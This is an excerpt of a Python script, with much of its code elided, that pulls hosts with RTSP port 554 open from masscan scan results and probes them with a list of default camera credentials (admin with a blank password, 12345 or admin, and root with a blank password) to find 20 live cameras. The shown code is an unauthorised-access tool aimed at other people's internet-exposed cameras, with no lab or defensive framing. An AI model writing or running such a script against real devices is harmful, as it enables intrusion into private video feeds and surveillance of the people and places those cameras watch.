#!/usr/bin/env python3
"""Extract RTSP cameras from masscan results and find 20 live"""
...
def extract_rtsp_targets(limit=100):
    """Extract IPs with port 554 open from masscan results"""
    targets = []
    ...
    with open(scan_file) as f:
        for line in f:
            if '554/open' in line:
                # Extract IP from masscan format
...
def probe_rtsp(ip):
    creds = [('admin', ''), ('admin', '12345'), ('admin', 'admin'), ('root', '')]
...
def main():
    print('[*] Extracting RTSP targets from masscan results...')
    targets = extract_rtsp_targets(limit=100)
    print(f'[*] Found {len(targets)} IPs with port 554 open')
    print(f'[*] Probing for 20 live cameras...\n')
